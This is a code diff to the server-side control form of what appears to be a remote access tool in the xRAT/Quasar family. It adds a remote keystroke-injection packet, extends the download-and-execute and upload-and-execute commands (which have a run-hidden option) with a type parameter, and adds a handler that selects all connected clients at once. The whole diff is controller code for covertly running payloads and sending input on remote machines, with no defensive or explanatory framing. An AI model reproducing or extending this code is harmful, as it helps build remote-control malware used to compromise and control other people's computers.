@@ -119,6 +119,7 @@ namespace xServer.Forms
                 typeof (Core.Packets.ServerPackets.Directory),
                 typeof (Core.Packets.ServerPackets.DownloadFile),
                 typeof (Core.Packets.ServerPackets.MouseClick),
+                typeof (Core.Packets.ServerPackets.KeyPress),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.VisitWebsite),
                 typeof (Core.Packets.ServerPackets.ShowMessageBox),
@@ -591,7 +592,7 @@ namespace xServer.Forms
                                     }
                                     new Core.Packets.ServerPackets.UploadAndExecute(ID,
                                         Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
-                                        currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                        currentBlock, UploadAndExecute.RunHidden, UploadAndExecute.Type).Execute(c);
                                 }
                             }
                         }).Start();
@@ -612,7 +613,7 @@ namespace xServer.Forms
                         {
                             Client c = (Client) lvi.Tag;
                             new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
-                                DownloadAndExecute.RunHidden).Execute(c);
+                                DownloadAndExecute.RunHidden, DownloadAndExecute.Type).Execute(c);
                         }
                     }
                 }
@@ -733,6 +734,23 @@ namespace xServer.Forms
             }
         }
 
+        private void selectAllClientsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstClients.Items)
+            {
+                try
+                {
+                    if (!lvi.Selected)
+                    {
+                        lvi.Selected = true;
+                    }
+                }
+                catch (Exception)
+                {
+
+                }
+            }
+        }
         private Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
